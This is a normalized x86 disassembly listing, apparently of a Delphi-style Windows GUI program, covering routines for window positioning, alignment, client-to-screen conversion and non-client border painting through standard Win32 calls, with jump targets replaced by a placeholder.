mov edi eax
push 0x0
push ebx
xor ecx ecx
mov edx 0x7fffffff
mov eax 0x7fffffff
call sub_416c50
mov eax edi
call sub_450b4c
mov esi eax
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebp ebp
mov edx [ ebx ]
cmp edx [ eax + 0x40 ]
jle r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
mov edx [ ebx + 0x4 ]
cmp edx [ eax + 0x44 ]
jle r-xdata
mov edx [ eax + 0x40 ]
mov [ ebx ] edx
inc ebp
dec esi
jne r-xdata
test [ eax + 0x51 ] 0x4
jne r-xdata
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
cmp edx [ ebx + 0x8 ]
jle r-xdata
mov edx [ eax + 0x44 ]
mov [ ebx + 0x4 ] edx
mov edx ebp
mov eax edi
call sub_450b10
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
cmp edx [ ebx + 0xc ]
jle r-xdata
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
mov [ ebx + 0x8 ] edx
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
mov [ ebx + 0xc ] edx
sub_453ec4
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
mov [ ebx ] eax
xor eax eax
mov [ ebx + 0x4 ] eax
push ebx
mov eax esi
call sub_453e1c
push eax
call ClientToScreen
pop esi
pop ebx
retn
sub_453efc
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_454120
test al al
je r-xdata
push 0x16
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_453e1c
push eax
call SetWindowPos
mov eax ebx
mov si 0xffd0
call sub_403370
sub_453fb8
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
or eax 0xffffffff
pop esi
pop ebx
retn
mov eax [ esi + 0x194 ]
mov edx ebx
call sub_418304
pop esi
pop ebx
retn
sub_453fdc
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
mov eax ebx
call sub_453fb8
movsx eax ax
test eax eax
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x30 ]
mov ebp [ edx + 0x194 ]
mov edx [ ebp + 0x8 ]
test si si
jge r-xdata
movsx ecx si
cmp edx ecx
jg r-xdata
xor esi esi
movsx edi si
cmp eax edi
je r-xdata
mov esi edx
dec esi
mov edx ebp
xchg edx eax
call sub_418198
mov edx edi
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x194 ]
mov ecx ebx
call sub_418324
sub_454050
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x1a4 ]
je r-xdata
pop esi
pop ebx
retn
mov [ esi + 0x1a4 ] bl
mov eax esi
call sub_454120
test al al
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb028
mov eax esi
call sub_44e7e8
push 0xfffffff0
mov eax [ esi + 0x180 ]
push eax
call GetWindowLongA
and eax 0xfffeffff
test bl bl
je r-xdata
push eax
push 0xfffffff0
mov eax [ esi + 0x180 ]
push eax
call SetWindowLongA
or eax 0x10000
sub_4540b0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_454114
push [ fs : eax ]
mov [ fs : eax ] esp
cmp dl [ ebx + 0x1a7 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45411b
lea eax [ ebp - 0x4 ]
call sub_405758
retn
mov [ ebx + 0x1a7 ] dl
test [ ebx + 0x1c ] 0x10
setne al
xor al 0x1
test al dl
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
mov si 0xffc6
call sub_403370
mov edx [ ebp - 0x4 ]
lea eax [ ebx + 0x17c ]
call sub_405770
sub_45412c
push ebx
push esi
push edi
add esp 0xffffffc4
mov ebx eax
mov eax [ ebx + 0x180 ]
push eax
call IsIconic
test eax eax
je r-xdata
push esp
mov eax [ ebx + 0x180 ]
push eax
call GetWindowRect
mov [ esp + 0x10 ] 0x2c
lea eax [ esp + 0x10 ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call GetWindowPlacement
lea esi [ esp + 0x2c ]
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
jmp r-xdata
mov eax [ esp ]
mov [ ebx + 0x40 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x44 ] eax
mov eax [ esp + 0x8 ]
sub eax [ esp ]
mov [ ebx + 0x48 ] eax
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
mov [ ebx + 0x4c ] eax
mov eax ebx
call sub_44cc88
add esp 0x3c
pop edi
pop esi
pop ebx
retn
push 0xfffffff8
mov eax [ ebx + 0x180 ]
push eax
call GetWindowLongA
mov esi eax
test esi esi
je r-xdata
push 0xfffffff0
mov eax [ ebx + 0x180 ]
push eax
call GetWindowLongA
test eax 0x40000000
je r-xdata
push esp
push esi
call ScreenToClient
lea eax [ esp + 0x8 ]
push eax
push esi
call ScreenToClient
sub_4541e4
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] edx
mov ebp eax
mov eax [ ebp + 0x194 ]
test eax eax
je r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
inc edi
mov [ esp + 0x4 ] 0x0
mov eax [ ebp + 0x194 ]
mov edx [ esp + 0x4 ]
call sub_4182a8
mov ebx eax
mov edx ebx
mov eax [ esp ]
call sub_41814c
mov edx [ esp ]
mov eax ebx
mov si 0xffb4
call sub_403370
inc [ esp + 0x4 ]
dec edi
jne r-xdata
sub_454244
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x5 ] cl
mov edi edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403144
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_45433a
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov si 0xffb4
call sub_403370
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_454341
mov eax [ ebp - 0x14 ]
call sub_403174
retn
mov edx edi
mov eax [ ebp - 0x14 ]
call sub_418304
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0xffffffff
jne r-xdata
mov ebx [ ebp - 0x10 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
test ebx ebx
jne r-xdata
inc ebx
mov eax [ ebp - 0x14 ]
cmp ebx [ eax + 0x8 ]
jne r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x8 ]
dec eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
dec ebx
mov eax [ ebp - 0x14 ]
mov ebx [ eax + 0x8 ]
mov edx ebx
mov eax [ ebp - 0x14 ]
call sub_4182a8
mov edi eax
mov eax edi
mov si 0xffb8
call sub_403370
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
cmp ebx [ ebp - 0x10 ]
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp [ edi + 0x1a4 ] 0x0
je r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov [ ebp - 0xc ] edi
mov eax [ edi + 0x30 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
sub_454350
push ebp
mov ebp esp
push esi
mov esi edx
mov edx [ ebp + 0x8 ]
push edx
xor dl 0x1
push edx
mov edx esi
call sub_454244
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebp
retn 0x4
mov eax esi
mov edx [ eax ]
call [ edx + 0xc4 ]
sub_45437c
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_464dc0
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
push 0x1
push 0x0
mov cl 0x1
xor edx edx
mov eax ebx
call sub_454244
test eax eax
jne r-xdata
test eax eax
je r-xdata
push 0x0
push 0x0
mov cl 0x1
xor edx edx
mov eax ebx
call sub_454244
mov edx eax
mov eax esi
call sub_468b24
sub_4543c0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_450b4c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx eax
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_450b10
mov edx [ eax + 0x4 ]
cmp edx [ ebp - 0x8 ]
jne r-xdata
sub_454408
push ebx
push esi
mov esi ecx
mov ebx edx
mov eax ebx
mov edx [ r-xdata ]
call sub_403300
test al al
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_403300
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_453ac4
pop esi
pop ebx
retn
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_44d8a4
sub_454450
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0x74 ]
cmp [ eax + 0x14 ] 0x0
jbe r-xdata
xor edx edx
mov [ edi ] edx
mov edx [ esi + 0x74 ]
mov edx [ edx + 0x14 ]
mov [ edi ] edx
jmp r-xdata
xor edx edx
mov [ ecx ] edx
mov edx [ esi + 0x74 ]
mov edx [ edx + 0x10 ]
mov [ ecx ] edx
jmp r-xdata
cmp [ eax + 0x10 ] 0x0
jbe r-xdata
mov edx [ ebp + 0xc ]
xor ebx ebx
mov [ edx ] ebx
mov edx [ esi + 0x74 ]
mov edx [ edx + 0xc ]
mov ebx [ ebp + 0xc ]
mov [ ebx ] edx
jmp r-xdata
cmp [ eax + 0xc ] 0x0
jbe r-xdata
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax ] edx
mov eax [ esi + 0x74 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
jmp r-xdata
cmp [ eax + 0x8 ] 0x0
jbe r-xdata
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x38 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_4544d4
push ebp
mov ebp esp
add esp 0xffffffa0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax esi
call sub_454120
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax esi
call sub_450b4c
test eax eax
je r-xdata
lea edx [ ebp - 0x5d ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x5d ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x8c ]
lea eax [ ebp - 0x5d ]
push eax
call IsRectEmpty
test eax eax
jne r-xdata
mov eax [ esi + 0x48 ]
mov edx [ ebp - 0x55 ]
sub edx [ ebp - 0x5d ]
sub eax edx
mov [ ebp - 0xc ] eax
mov edx [ esi + 0x4c ]
mov ecx [ ebp - 0x51 ]
sub ecx [ ebp - 0x59 ]
sub edx ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x18 ] edx
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
sub [ eax ] edx
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
sub [ eax ] edx
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x14 ]
sub [ eax ] edx
xor ecx ecx
push ebp
push sub_454896
push [ fs : ecx ]
mov [ fs : ecx ] esp
xor eax eax
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x30 ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
xor eax eax
mov [ ebp - 0x34 ] eax
xor eax eax
mov [ ebp - 0x28 ] eax
xor eax eax
mov [ ebp - 0x38 ] eax
xor eax eax
mov [ ebp - 0x2c ] eax
xor eax eax
mov [ ebp - 0x3c ] eax
mov eax esi
call sub_450b4c
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x18 ]
sub [ eax ] edx
cmp [ ebp - 0x20 ] 0x0
jle r-xdata
inc edi
mov [ ebp - 0x1c ] 0x0
cmp [ ebp - 0x24 ] 0x0
jle r-xdata
mov eax [ ebp - 0x20 ]
add eax [ ebp - 0x30 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx ]
jle r-xdata
lea eax [ ebp - 0x44 ]
push eax
lea eax [ ebp - 0x4c ]
push eax
lea ecx [ ebp - 0x48 ]
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_454450
mov al [ ebx + 0x5b ]
sub al 0x1
jb r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebp - 0x28 ] 0x0
jle r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebp - 0x20 ]
add eax [ ebp - 0x30 ]
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
mov al [ ebx + 0x61 ]
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
sub al 0x2
jb r-xdata
inc [ ebp - 0x1c ]
dec edi
jne r-xdata
test [ ebx + 0x51 ] 0x4
jne r-xdata
cmp [ ebp - 0x2c ] 0x0
jle r-xdata
mov eax [ ebp - 0x28 ]
add eax [ ebp - 0x38 ]
mov edx [ ebp - 0x8 ]
cmp eax [ edx ]
jle r-xdata
mov eax [ ebp - 0x24 ]
add eax [ ebp - 0x34 ]
mov edx [ ebp + 0xc ]
mov [ edx ] eax
mov eax [ ebp - 0x24 ]
add eax [ ebp - 0x34 ]
mov edx [ ebp + 0xc ]
cmp eax [ edx ]
jle r-xdata
mov [ ebp - 0x4d ] 0x0
jmp r-xdata
mov [ ebp - 0x4d ] 0x1
cmp [ ebp - 0x40 ] 0x0
jle r-xdata
mov [ ebp - 0x4d ] 0x1
jmp r-xdata
sub al 0x2
je r-xdata
mov edx [ ebp - 0x1c ]
mov eax esi
call sub_450b10
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebp - 0x28 ]
add eax [ ebp - 0x38 ]
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
mov al [ ebx + 0x5b ]
sub al 0x1
jb r-xdata
cmp [ ebp - 0x44 ] 0x0
jle r-xdata
mov eax [ ebp - 0x55 ]
sub eax [ ebp - 0x5d ]
sub eax [ ebx + 0x48 ]
sub eax [ ebp - 0x40 ]
mov [ ebp - 0x40 ] eax
mov [ ebp - 0x4d ] 0x2
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
add [ eax ] edx
mov eax [ ebp - 0x2c ]
add eax [ ebp - 0x3c ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebp - 0x2c ]
add eax [ ebp - 0x3c ]
mov edx [ ebp + 0x8 ]
cmp eax [ edx ]
jle r-xdata
mov al [ ebx + 0x61 ]
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
add al 0xfe
sub al 0x2
jb r-xdata
mov eax [ ebp - 0x55 ]
sub eax [ ebp - 0x5d ]
add eax [ ebp - 0x44 ]
sub eax [ ebx + 0x48 ]
mov [ ebp - 0x44 ] eax
jmp r-xdata
mov [ ebp - 0x4d ] 0x3
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
add [ eax ] edx
xor eax eax
jmp r-xdata
mov al 0x1
cmp [ ebp - 0x48 ] 0x0
jle r-xdata
mov al 0x1
jmp r-xdata
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x14 ]
add [ eax ] edx
mov dl [ ebp - 0x4d ]
dec edx
sub dl 0x2
jb r-xdata
cmp [ ebp - 0x4c ] 0x0
jle r-xdata
mov edx [ ebp - 0x51 ]
sub edx [ ebp - 0x59 ]
sub edx [ ebx + 0x4c ]
sub edx [ ebp - 0x48 ]
mov [ ebp - 0x48 ] edx
mov al 0x2
jmp r-xdata
jmp r-xdata
retn
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x18 ]
add [ eax ] edx
cmp [ ebp - 0x40 ] 0x0
jle r-xdata
je r-xdata
mov edx [ ebp - 0x51 ]
sub edx [ ebp - 0x59 ]
add edx [ ebp - 0x4c ]
sub edx [ ebx + 0x4c ]
mov [ ebp - 0x4c ] edx
jmp r-xdata
mov al 0x3
cmp [ ebp - 0x44 ] 0x0
jle r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
cmp edx [ ebp - 0x40 ]
jge r-xdata
mov edx [ ebx + 0x48 ]
add [ ebp - 0x30 ] edx
add [ ebp - 0x34 ] edx
jmp r-xdata
dec eax
sub al 0x2
jb r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx ]
cmp edx [ ebp - 0x44 ]
jle r-xdata
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x40 ]
mov [ edx ] ecx
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
cmp edx [ ebp - 0x20 ]
jle r-xdata
cmp [ ebp - 0x48 ] 0x0
jle r-xdata
je r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp - 0x44 ]
mov [ edx ] ecx
mov edx [ ebp + 0xc ]
mov edx [ edx ]
cmp edx [ ebp - 0x24 ]
jle r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
mov [ ebp - 0x20 ] edx
cmp [ ebp - 0x4c ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x48 ]
jge r-xdata
mov eax [ ebx + 0x4c ]
add [ ebp - 0x38 ] eax
add [ ebp - 0x3c ] eax
jmp r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx ]
mov [ ebp - 0x24 ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x4c ]
jle r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x48 ]
mov [ eax ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x28 ]
jle r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x4c ]
mov [ eax ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x2c ]
jle r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x2c ] eax
jmp r-xdata
sub_4548b0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_4544d4
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_44e684
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_4548ec
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_44f508
mov eax esi
mov edx [ r-xdata ]
call sub_403300
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov edx [ esi + 0x74 ]
mov eax edi
call sub_44cf9c
cmp [ edi + 0x158 ] 0x0
jne r-xdata
sub_454934
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44f728
mov eax esi
mov edx [ r-xdata ]
call sub_403300
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx [ ebx + 0x158 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x48 ]
sub_454964
push ebp
mov ebp esp
add esp 0xffffffc8
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0xd ] 0x1
mov eax [ ebp - 0x4 ]
call sub_454120
test al al
je r-xdata
mov al [ ebp - 0xd ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5b ] 0x5
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xb4 ]
lea edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov eax [ ebp - 0x4 ]
call sub_4506b4
xor ecx ecx
push ebp
push sub_454a93
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x4 ]
call sub_450b4c
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x4 ]
call sub_450b4c
test eax eax
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_454a9a
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xffef
mov eax [ ebp - 0x4 ]
call sub_4506bc
retn
inc esi
mov [ ebp - 0x14 ] 0x0
mov edx [ ebp - 0x4 ]
mov dl [ edx + 0x5b ]
mov ecx edx
test cl cl
je r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
mov edi [ ebp - 0x28 ]
sub edi [ ebp - 0x38 ]
jmp r-xdata
add cl 0xfd
sub cl 0x2
jae r-xdata
inc [ ebp - 0x14 ]
dec esi
jne r-xdata
test [ eax + 0x51 ] 0x4
jne r-xdata
sub dl 0x3
jae r-xdata
xor edi edi
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_450b10
cmp [ eax + 0x57 ] 0x0
jne r-xdata
xor edx edx
mov [ ebp - 0x18 ] edx
mov edx [ ebp - 0x24 ]
sub edx [ ebp - 0x34 ]
mov [ ebp - 0x18 ] edx
jmp r-xdata
mov edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x4c ]
push edx
mov ecx [ eax + 0x44 ]
sub ecx [ ebp - 0x18 ]
mov edx [ eax + 0x40 ]
sub edx edi
mov ebx [ eax ]
call [ ebx + 0x84 ]
sub_454a9a
mov eax [ ebp - 0x4 ]
mov dl [ eax + 0x5b ]
mov eax edx
test al al
je r-xdata
mov eax [ ebp - 0x20 ]
sub eax [ ebp - 0x28 ]
test eax eax
jle r-xdata
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax ] edx
mov ecx [ ebp - 0x4 ]
add eax [ ecx + 0x48 ]
mov ecx [ ebp - 0x30 ]
sub ecx [ ebp - 0x38 ]
sub eax ecx
mov ecx [ ebp - 0x8 ]
mov [ ecx ] eax
cmp dl 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
mov dl [ eax + 0x5b ]
mov eax edx
sub al 0x3
jae r-xdata
mov al [ ebp - 0xd ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x1c ]
sub eax [ ebp - 0x24 ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffd0
call sub_403370
jmp r-xdata
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax ] edx
mov ecx [ ebp - 0x4 ]
add eax [ ecx + 0x4c ]
mov ecx [ ebp - 0x2c ]
sub ecx [ ebp - 0x34 ]
sub eax ecx
mov ecx [ ebp - 0xc ]
mov [ ecx ] eax
cmp dl 0x2
jne r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffd0
call sub_403370
jmp r-xdata
sub_454b30
sub edx 0x1
jb r-xdata
cmp cl [ eax + 0x163 ]
je r-xdata
je r-xdata
retn
mov [ eax + 0x163 ] cl
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_44e7e8
retn
cmp cl [ eax + 0x164 ]
je r-xdata
jmp r-xdata
mov [ eax + 0x164 ] cl
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_44e7e8
sub_454b74
push ebx
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ ebx + 0x162 ]
cmp al [ esp ]
je r-xdata
pop edx
pop ebx
retn
mov al [ esp ]
mov [ ebx + 0x162 ] al
push 0x0
xor ecx ecx
mov edx 0xb03b
mov eax ebx
call sub_44e7e8
sub_454be4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ esi + 0x8 ]
mov esi eax
mov eax [ ebx + 0x16c ]
neg eax
push eax
mov edx [ ebx + 0x16c ]
neg edx
push eax
mov edi esi
push edi
call InflateRect
cmp [ ebx + 0x165 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
xor eax eax
cmp [ ebx + 0x163 ] 0x0
je r-xdata
cmp [ ebx + 0x164 ] 0x0
je r-xdata
add eax [ ebx + 0x168 ]
mov esi edi
test [ ebx + 0x162 ] 0x1
je r-xdata
add eax [ ebx + 0x168 ]
test [ ebx + 0x162 ] 0x2
je r-xdata
add [ esi ] eax
test [ ebx + 0x162 ] 0x4
je r-xdata
add [ esi + 0x4 ] eax
test [ ebx + 0x162 ] 0x8
je r-xdata
sub [ esi + 0x8 ] eax
sub [ esi + 0xc ] eax
sub_454c74
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x165 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_453e1c
push eax
call GetWindowDC
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_454eda
push [ fs : edx ]
mov [ fs : edx ] esp
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_453e1c
push eax
call GetClientRect
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_453e1c
push eax
call GetWindowRect
push 0x2
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_453e1c
push eax
push 0x0
call MapWindowPoints
mov eax [ ebp - 0x28 ]
neg eax
push eax
mov eax [ ebp - 0x2c ]
neg eax
push eax
lea eax [ ebp - 0x1c ]
push eax
call OffsetRect
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call ExcludeClipRect
lea esi [ ebp - 0x2c ]
lea edi [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x16c ]
push eax
push eax
lea eax [ ebp - 0x1c ]
push eax
call InflateRect
lea esi [ ebp - 0x1c ]
lea edi [ ebp - 0x2c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x165 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x16c ] 0x0
jbe r-xdata
mov eax [ ebp - 0x20 ]
push eax
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call IntersectClipRect
lea esi [ ebp - 0x3c ]
lea edi [ ebp - 0x2c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x28 ]
neg eax
push eax
mov eax [ ebp - 0x2c ]
neg eax
push eax
lea eax [ ebp - 0x2c ]
push eax
